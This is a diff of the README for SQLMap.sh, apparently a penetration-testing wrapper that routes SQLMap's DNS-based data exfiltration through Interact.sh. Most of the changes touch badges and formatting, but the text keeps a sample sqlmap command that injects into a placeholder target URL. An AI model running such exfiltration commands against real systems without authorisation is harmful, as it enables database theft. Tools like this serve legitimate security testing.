@@ -1,10 +1,9 @@
 ![SQLMap.sh](./pics/sqlmapsh.png)
 
-[![Go Report Card](https://goreportcard.com/badge/github.com/unlock-security/sqlmapsh)](https://goreportcard.com/report/github.com/unlock-security/sqlmapsh)
-[![GPLv3 license](https://img.shields.io/badge/License-GPLv3-blue.svg)](https://github.com/unlock-security/sqlmapsh/blob/main/LICENSE)
-[![GitHub release (latest by date)](https://img.shields.io/github/v/release/unlock-security/sqlmapsh)](https://github.com/unlock-security/sqlmapsh/releases/latest)
-[![Twitter](https://img.shields.io/static/v1?style=flat&logo=twitter&label=Twitter&message=unlock_security&color=blue)](https://www.linkedin.com/company/unlock-security)
-[![LinkedIn](https://img.shields.io/static/v1?style=flat&logo=linkedin&label=LinkedIn&message=Unlock+Security&color=blue)](https://www.linkedin.com/company/unlock-security)
+[![Go Report Card](https://goreportcard.com/badge/github.com/unlock-security/sqlmapsh?style=for-the-badge)](https://goreportcard.com/report/github.com/unlock-security/sqlmapsh)
+[![License](https://img.shields.io/github/license/unlock-security/sqlmapsh?style=for-the-badge&label=License)](https://github.com/unlock-security/sqlmapsh?tab=GPL-3.0-1-ov-file#readme)
+[![GitHub release (latest by date)](https://img.shields.io/github/v/release/unlock-security/sqlmapsh?style=for-the-badge)](https://github.com/unlock-security/sqlmapsh/releases/latest)
+[![Made by 🔓 Unlock Security](https://img.shields.io/badge/Made_by-🔓_Unlock_Security-blue.svg?style=for-the-badge)](https://www.unlock-security.it/?utm_source=github&utm_medium=repo&utm_campaign=sqlmapsh)
 
 
 SQLMap.sh is a SQLMap wrapper that lets you use Interact.sh as a DNS server for exfiltrating data with zero configuration.
@@ -25,7 +24,8 @@ go install github.com/unlock-security/sqlmapsh@latest
 
 Just replace `sqlmap` with `sudo sqlmapsh` when you want to use SQLMap with data exfiltration via DNS.
 
-> **Note:** SQLMap requires root privileges to perform data exfiltration via DNS because it needs to bind it's own DNS server locally on port 53
+> [!IMPORTANT]
+> SQLMap requires root privileges to perform data exfiltration via DNS because it needs to bind it's own DNS server locally on port 53
 
 For example:
 
@@ -39,7 +39,11 @@ Become:
 $ sudo sqlmapsh -u 'https://www.target.com/page=1' -p page --level=5 --risk=3 --technique=E --banner
 ```
 
+---
 
-## License
-
-[SQLMap.sh](https://github.com/unlock-security/sqlmapsh) is distributed under [GPLv3.0 License](https://github.com/unlock-security/sqlmapsh/blob/main/LICENSE) and made with 💙 by the Unlock Security team.
+<p align="center">Made with 💙 by Unlock Security</p>
+<p align="center">
+  <a href="https://www.unlock-security.it/?utm_source=github&utm_medium=repo&utm_campaign=wshell" target="_blank" rel="noopener">
+    <img src="https://www.unlock-security.it/wp-content/uploads/2022/12/logo.svg" width="150">
+  </a>
+</p>
